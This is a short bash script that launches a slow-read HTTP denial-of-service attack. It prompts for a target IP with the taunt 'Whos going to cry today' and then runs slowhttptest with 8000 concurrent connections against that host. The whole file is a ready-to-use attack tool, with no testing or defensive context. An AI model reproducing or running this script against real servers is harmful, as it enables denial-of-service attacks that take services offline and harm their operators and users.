#! /bin/bash

echo "###################### SLOW-READ ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo "################# STARTING THREADS ######################"

slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://$tarip/ -p 3
